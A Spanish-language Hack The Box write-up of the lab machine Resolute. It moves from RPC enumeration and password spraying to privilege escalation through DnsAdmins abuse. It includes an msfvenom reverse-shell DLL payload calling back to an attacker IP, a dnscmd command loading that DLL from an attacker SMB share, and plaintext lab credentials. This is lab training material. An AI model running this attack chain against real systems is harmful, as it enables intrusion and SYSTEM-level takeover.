---
title: HTB Resolute
date: 2024-04-04 14:10:00 +0800
author: pablo
categories: [HTB, Windows]
tags:
  [
    rpc,
    nxc,
    smb,
    EvilWinRM,
    Information Leakage,
    LOLBAS,
    Docker,
    Abusing DnsAdmins Group,
    ActiveDirectory,
  ]
image:
  path: /assets/img/Resolute/Portada.png
---

## Descripción

El ataque comienza con la enumeración de cuentas de usuario utilizando Windows RPC, que incluye una lista de usuarios y una contraseña predeterminada en un comentario. Con la contraseña encontrada se realizo un ataque tipo `password spraying` y esa contraseña funciona para uno de los usuarios a través de WinRM. A partir de ahí, encuentro las credenciales de los siguientes usuarios en un archivo de transcripción de PowerShell. Este usuario está en el grupo DnsAdmins, lo que permite un ataque contra dnscmd para obtener acceso a SYSTEM.

---

## Reconocimiento

Se comprueba que la máquina está activa y se determina su sistema operativo a través del script implementado en bash `whichSystem.sh`

```bash
❯ ping -c 1 10.10.10.169
PING 10.10.10.169 (10.10.10.169) 56(84) bytes of data.
64 bytes from 10.10.10.169: icmp_seq=1 ttl=127 time=106 ms

--- 10.10.10.169 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 106.391/106.391/106.391/0.000 ms
```

El sistema operativo es una `Windows`

### Nmap

Se va a realizar un escaneo de todos los puertos abiertos en el protocolo TCP a través de `nmap`. Comando: `sudo nmap -p- --open -sS -T4 -vvv -n -Pn <IP> -oG allPorts`
Puertos abiertos son:

```bash
53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49678,49679,49684,49820
```

Se procede a realizar un análisis de detección de servicios y la identificación de versiones utilizando los puertos abiertos encontrados.

Comando: `nmap -sCV -p<Ports Open> <IP> -oN targeted`

```bash
❯ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49678,49679,49684,49820 -sCV 10.10.10.169 -oN targeted
Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-19 11:45 CDT
Nmap scan report for 10.10.10.169
Host is up (0.11s latency).

PORT      STATE  SERVICE      VERSION
53/tcp    open   domain       Simple DNS Plus
88/tcp    open   kerberos-sec Microsoft Windows Kerberos (server time: 2024-03-19 16:52:22Z)
135/tcp   open   msrpc        Microsoft Windows RPC
139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open               Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
3268/tcp  open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped
5985/tcp  open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open   mc-nmf       .NET Message Framing
47001/tcp open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open   msrpc        Microsoft Windows RPC
49665/tcp open   msrpc        Microsoft Windows RPC
49666/tcp open   msrpc        Microsoft Windows RPC
49667/tcp open   msrpc        Microsoft Windows RPC
49671/tcp open   msrpc        Microsoft Windows RPC
49678/tcp open   msrpc        Microsoft Windows RPC
49679/tcp open   ncacn_http   Microsoft Windows RPC over HTTP 1.0
49684/tcp open   msrpc        Microsoft Windows RPC
49820/tcp closed unknown
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2024-03-19T09:53:17-07:00
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-03-19T16:53:16
|_  start_date: 2024-03-19T16:47:26
|_clock-skew: mean: 2h27m01s, deviation: 4h02m32s, median: 6m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.06 seconds
```

### Enumeración SMB

Utilizando `smbclient` y `smbmap`

Utilizando:

```bash
> smbmap -H 10.10.10.169
> smbmap -H 10.10.10.169 -u guest
> smbclient -N -L \\10.10.10.169
```

![Untitled](/assets/img/Resolute/Pasted image 20240331180717.png)

Sin credenciales no se pudo listar archivos compartidos.

### Enumeración RPC

```bash
rpcclient -U "" 10.10.10.169 -N -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v "0x" | tr -d '[]' > users.txt
```

![Untitled](/assets/img/Resolute/Pasted image 20240319121902.png)|

A través de `nxc` se procede a encontrar el dominio de la máquina, en este caso corresponde a `megabank.local`

![Untitled](/assets/img/Resolute/Pasted image 20240319122159.png)

Utilizando `impacket-GetNPUsers`

> `impacket-GetNPUsers` :
> -Tiene como objetivo enumerar y obtener TGTs (Tickets-Granting Tickets) para aquellos usuarios que tienen la propiedad "Do not require Kerberos preauthentication" establecida.
>
> - La propiedad "Do not require Kerberos preauthentication" (UF_DONT_REQUIRE_PREAUTH) es una configuración de seguridad en el entorno de Active Directory que permite a los usuarios autenticarse sin la necesidad de preautenticación Kerberos. Esto puede hacer que los hashes de las contraseñas sean más susceptibles a ser comprometidos.

![Untitled](/assets/img/Resolute/Pasted image 20240319122447.png)

- Enumerar usuarios

```bash
rpcclient -U "" -N 10.10.10.169 -N -c 'enumdomusers'
```

- Enumerar grupos

```bash
rpcclient -U "" -N 10.10.10.169 -N -c 'enumdomgroups'
```

- Enumerar por rid group

```bash
rpcclient -U "" -N 10.10.10.169 -N -c 'querygroupmem <0x200>'
```

- Enumerar por rid user

```bash
rpcclient -U "" -N 10.10.10.169 -N -c 'queryuser <0x1f4>'
```

- Enumerar todas las descripciones de usuario

```bash
rpcclient -U "" -N 10.10.10.169 -N -c 'querydispinfo'
```

![Untitled](/assets/img/Resolute/Pasted image 20240319123303.png)
Enumerando el campo descripción se llega a listar información relevante, nos muestra lo que parece ser una contraseña:

```bash
Welcome123
```

Realizando un ataque de `password spraying`

![Untitled](/assets/img/Resolute/Pasted image 20240319123718.png)

Se visualiza que es válida para el usuario `melanie`

Comprobando password a través de `nxc` para verificar si dispone de permisos administrador, en caso de serlo nos debería mostrar el mensaje de `Pwned`

![Untitled](/assets/img/Resolute/Pasted image 20240319133202.png)

Probando `winrm` y se comprueba que el usuario `melanie` pertenece al grupo `Remote Management Users`

![Untitled](/assets/img/Resolute/Pasted image 20240319133553.png)

## Shell as melanie

Conectándonos por `evil-winrm`

```bash
evil-winrm -i 10.10.10.169 -u 'melanie' -p 'Welcome123!'
```

![Untitled](/assets/img/Resolute/Pasted image 20240319133737.png)

Enumerando la máquina se encuentra que existe los usuarios `Administrator` y `ryan`

![Untitled](/assets/img/Resolute/Pasted image 20240319134950.png)

Enumerando desde la raíz por archivos ocultos en la máquina:

![Untitled](/assets/img/Resolute/Pasted image 20240319135109.png)

En la ruta `C:\PSTranscripts\20191203` existe un archivo oculto llamado `PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt`

![Untitled](/assets/img/Resolute/Pasted image 20240319135354.png)

```bash
##Credentials
ryan:Serv3r4Admin4cc123!
```

Donde se tiene el probable password del usuario `ryan`

Comprobando con `nxc` se verifica que la contraseña es válida y dispone de permisos de administrador, ya que nos muestra el mensaje de `Pwn3d!`

![Untitled](/assets/img/Resolute/Pasted image 20240319135526.png)

## Shell as ryan

Conectándonos con `evil-winrm`

En el escritorio existe una nota

![Untitled](/assets/img/Resolute/Pasted image 20240319140114.png)

Enumerando:

![Untitled](/assets/img/Resolute/Pasted image 20240319135823.png)

Listando por todos los permisos verificamos que pertenecemos al grupo `DnsAdmins`

![Untitled](/assets/img/Resolute/Pasted image 20240319141357.png)

![Untitled](/assets/img/Resolute/Pasted image 20240319141434.png)

Listando por grupos locales que están dentro de `DnsAdmins` comprobamos que el grupo `Contractors` pertenece a este grupo y el usuario actual `ryan` pertenece a ese grupo

![Untitled](/assets/img/Resolute/Pasted image 20240319141629.png)

## Shell as SYSTEM

Utilizando [LOLBAS](https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/)

La idea es establecer un nuevo archivo de configuración para el servicio `DnsAdmins` a través de una nueva `.dll` la cual va a ejecutar desde el recurso compartido de la máquina atacante

Creando payload con `msfvenom`

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=443 -f dll -o pwned.dll
```

En nuestra máquina atacante deberemos estar compartiendo el archivo `pwned.dll` creando un recurso compartido a través de `impacket-smbserver` y en escucha a través de `nc` para recibir la reverse Shell

En la máquina víctima procedemos a realizar:

```bash
dnscmd.exe /config /serverlevelplugindll \\10.10.14.11\smbFolder\pwned.dll
```

![Untitled](/assets/img/Resolute/Pasted image 20240319143104.png)

Se procede a parar el servicio y a iniciarlo nuevamente, tal vez este procedimiento haya que correrlo varias veces hasta obtener la consola en la máquina atacante

```bash
sc.exe start dns #start service
sc.exe stop dns  #stop service
```

Obteniendo:

![Untitled](/assets/img/Resolute/Pasted image 20240319143413.png)

Se habrá ganado una consola con privilegios de `nt authority\system`

![Untitled](/assets/img/Resolute/Pasted image 20240319143459.png)
